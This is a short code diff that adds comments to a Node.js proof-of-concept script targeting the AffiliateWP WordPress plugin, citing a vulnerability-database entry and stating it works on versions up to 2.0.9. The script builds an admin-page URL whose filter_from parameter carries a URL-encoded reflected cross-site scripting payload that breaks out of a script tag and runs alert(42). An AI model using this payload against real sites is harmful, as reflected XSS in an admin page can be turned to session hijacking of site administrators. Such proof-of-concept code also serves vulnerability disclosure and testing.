@@ -1,3 +1,6 @@
+// https://wpvulndb.com/vulnerabilities/8835
+// works for AffiliateWP <= 2.0.9
+
 const fetch = require('node-fetch');
 
 const payloadURL = `http://${process.argv[2]}:${process.argv[3]}//wp-admin/admin.php?page=affiliate-wp-referrals&filter_from=%27%3C%2Fscript%3E%3Cscript%3Ealert%2842%29%3C%2Fscript%3E`;
